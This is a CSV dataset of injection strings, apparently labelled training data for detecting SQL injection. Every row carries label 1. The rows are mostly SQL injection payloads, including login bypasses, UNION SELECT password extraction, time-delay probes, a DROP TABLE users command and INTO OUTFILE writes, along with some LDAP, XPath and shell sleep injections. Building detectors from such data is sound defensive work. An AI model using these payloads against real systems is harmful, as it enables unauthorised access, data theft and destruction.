Data,Label
'sqlvuln,1
'+sqlvuln,1
sqlvuln;,1
 ( sqlvuln ) ,1
a' or 1 = 1--,1
"""a"""" or 1 = 1--""",1
 or a  =  a,1
a' or 'a'  =  'a,1
1 or 1 = 1,1
exec ( @s ) ,1
' or 1 = 1,1
‘ or 1 = 1 --,1
x' AND userid IS NULL; --,1
x' AND email IS NULL; --,1
anything' OR 'x' = 'x,1
x' AND 1 =  ( SELECT COUNT ( * )  FROM tabname ) ; --,1
x' AND members.email IS NULL; --,1
x' OR full_name LIKE '%Bob%,1
23 OR 1 = 1,1
' or '' = ',1
' or 'x' = 'x,1
 or x = x,1
' )  or  ( 'x' = 'x,1
0 or 1 = 1,1
' or 0 = 0 --,1
""" or 0 = 0 --",1
or 0 = 0 --,1
' or 0 = 0 #,1
" or 0 = 0 #""",1
or 0 = 0 #,1
' or 1 = 1--,1
""" or 1 = 1--",1
' or '1' = '1'--,1
' or 1 --',1
or 1 = 1--,1
or 1 = 1,1
or 1 = 1 --,1
' or 1 = 1 or '' = ',1
" or 1 = 1 or """" = ",1
' or a = a--,1
 or a = a,1
' )  or  ( 'a' = 'a,1
 )  or  ( a = a,1
hi or a = a,1
"hi or 1 = 1 --""",1
hi' or 1 = 1 --,1
hi' or 'a' = 'a,1
hi' )  or  ( 'a' = 'a,1
"""hi"""" )  or  ( """"a"""" = """"a""",1
'hi' or 'x' = 'x';,1
' or username like '%,1
' or uname like '%,1
' or userid like '%,1
' or uid like '%,1
' or user like '%,1
--sp_password,1
\x27UNION SELECT,1
' UNION SELECT,1
' UNION ALL SELECT,1
' or  ( EXISTS ) ,1
'  ( select top 1,1
'||UTL_HTTP.REQUEST,1
1;SELECT *,1
to_timestamp_tz,1
tz_offset,1
"<>""'%; )  ( &+",1
%27 or 1 = 1,1
 $ ( sleep 50 ) ,1
 'sleep 50',1
char%4039%41%2b%40SELECT,1
&apos; OR,1
%7C,1
*|,1
%2A%7C,1
* ( | ( mail = *  )  )  ,1
%2A%28%7C%28mail%3D%2A%29%29,1
* ( | ( objectclass = *  )  )  ,1
%2A%28%7C%28objectclass%3D%2A%29%29,1
 ( ,1
%28,1
 ) ,1
%29,1
&,1
%26,1
!,1
%21,1
x' or 1 = 1 or 'x' = 'y,1
/,1
//,1
//*,1
*/*,1
a' or 3 = 3--,1
"""a"""" or 3 = 3--""",1
' or 3 = 3,1
‘ or 3 = 3 --,1
'-',1
' ',1
'&',1
'^',1
'*',1
' or ''-',1
' or '' ',1
' or ''&',1
' or ''^',1
' or ''*',1
"""-""",1
""" """,1
"""&""",1
"""^""",1
"""*""",1
""" or """"-""",1
""" or """" """,1
""" or """"&""",1
""" or """"^""",1
""" or """"*""",1
or true--,1
""" or true--",1
' or true--,1
""" )  or true--",1
' )  or true--,1
' )  or  ( 'x' )  =  ( 'x,1
'  )  )   or   (  (  'x'  )  )   =   (  (  'x,1
""" or ""x"" = ""x",1
""" )  or  ( ""x"" )  =  ( ""x",1
"""  )  )   or   (  (  ""x""  )  )   =   (  (  ""x",1
or 1 = 1-- ,1
or 1 = 1#,1
or 1 = 1/*,1
admin' --,1
admin' #,1
admin'/*,1
admin' or '1' = '1,1
admin' or '1' = '1'--,1
admin' or '1' = '1'#,1
admin' or '1' = '1'/*,1
admin'or 1 = 1 or '' = ',1
admin' or 1 = 1,1
admin' or 1 = 1--,1
admin' or 1 = 1#,1
admin' or 1 = 1/*,1
admin' )  or  ( '1' = '1,1
admin' )  or  ( '1' = '1'--,1
admin' )  or  ( '1' = '1'#,1
admin' )  or  ( '1' = '1'/*,1
admin' )  or '1' = '1,1
admin' )  or '1' = '1'--,1
admin' )  or '1' = '1'#,1
admin' )  or '1' = '1'/*,1
"1234 ' AND 1 = 0 UNION ALL SELECT 'admin', '81dc9bdb52d04dc20036dbd8313ed055",1
"admin"" --",1
"admin"" #",1
"admin""/*",1
"admin"" or ""1"" = ""1",1
"admin"" or ""1"" = ""1""--",1
"admin"" or ""1"" = ""1""#",1
"admin"" or ""1"" = ""1""/*",1
"admin""or 1 = 1 or """" = """,1
"admin"" or 1 = 1",1
"admin"" or 1 = 1--",1
"admin"" or 1 = 1#",1
"admin"" or 1 = 1/*",1
"admin"" )  or  ( ""1"" = ""1",1
"admin"" )  or  ( ""1"" = ""1""--",1
"admin"" )  or  ( ""1"" = ""1""#",1
"admin"" )  or  ( ""1"" = ""1""/*",1
"admin"" )  or ""1"" = ""1",1
"admin"" )  or ""1"" = ""1""--",1
"admin"" )  or ""1"" = ""1""#",1
"admin"" )  or ""1"" = ""1""/*",1
"1234 "" AND 1 = 0 UNION ALL SELECT ""admin"", ""81dc9bdb52d04dc20036dbd8313ed055",1
‘-sqlite_version (  )  UNION SELECT password FROM users- -,1
sleep ( 9999 ) ,1
 ) -sleep ( 9999,1
1337 INTO OUTFILE ‘xxx’--,1
1337 )  INTO OUTFILE ‘xxx’--,1
123;DROP TABLE users--,1
123 ) ;DROP TABLE users--,1
 )  OR  ( SELECT password FROM users ...,1
*/UNION SELECT password FROM users--,1
2 and 456 = 678,1
2 or 345 = 345,1
2 order by 9999,1
2 order by 1,1
2/0 and 456 = 678,1
2/1 or 345 = 345,1
2/*f*/and/*f*/456 = 678,1
2/*f*/or/*f*/345 = 345,1
a' and '456' = '678,1
a' or '345' = '345,1
a' and 'fghi' = 'fghj'-- #,1
a' or 'dfth' = 'dfth'-- #,1
a' order by 9999-- #,1
a' order by 1-- #,1
a'and/*g*/456 = 678-- #,1
a'or/*g*/345 = 345-- #,1
a' and 'fghi' = 'fghj'#,1
a' or 'dfth' = 'dfth'#,1
a' order by 9999#,1
a' order by 1#,1
a'||/**/456 = 678#,1
a'||/**/345 = 345#,1
a' and 'fghi' = 'fghj'--,1
a' or 'dfth' = 'dfth'--,1
a' order by 9999--,1
a' order by 1--,1
a'and/*d*/456 = 678--,1
a'or/*d*/345 = 345--,1
345'%5d|//*|/a%5b'a,1
456'%5d|//a|/a%5b'a,1
"345' ) %5d|//*|/a%5bcontains ( a,'b",1
"456' ) %5d|//a|/a%5bcontains ( a,'b",1
"a"" and ""456"" = ""678",1
"a"" or ""345"" = ""345",1
"a"" and ""fghi"" = ""fghj""-- #",1
"a"" or ""dfth"" = ""dfth""-- #",1
"a"" order by 9999-- #",1
"a"" order by 1-- #",1
"a""and/*g*/456 = 678-- #",1
"a""or/*g*/345 = 345-- #",1
"345""%5d|//*|/a%5b""a",1
"456""%5d|//a|/a%5b""a",1
"345"" ) %5d|//*|/a%5bcontains ( a,""b",1
"456"" ) %5d|//a|/a%5bcontains ( a,""b",1
1 waitfor delay '0:0:X'--,1
1; waitfor delay '0:0:X'--,1
1'; waitfor delay '0:0:X'--,1
1 ) ; waitfor delay '0:0:X'--,1
1  )  )  ; waitfor delay '0:0:X'--,1
1' ) ; waitfor delay '0:0:X'--,1
1'  )  )  ; waitfor delay '0:0:X'--,1
